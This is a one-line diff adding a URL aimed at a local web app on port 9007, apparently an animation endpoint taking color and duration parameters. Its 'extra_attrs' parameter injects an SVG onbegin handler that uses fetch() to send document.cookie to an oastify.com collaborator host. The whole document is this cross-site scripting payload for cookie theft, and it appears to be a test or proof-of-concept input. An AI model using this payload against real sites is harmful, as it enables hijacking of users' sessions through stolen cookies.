@@ -1,0 +1,1 @@
+http://localhost:9007/?duration=2&from_color=%23ff0000&to_color=%230000ff&repeat_count=1&extra_attrs=onbegin=fetch(`http://onf4inwecka29oo5mcagsxkuqlwck48t.oastify.com/`%2bdocument.cookie)
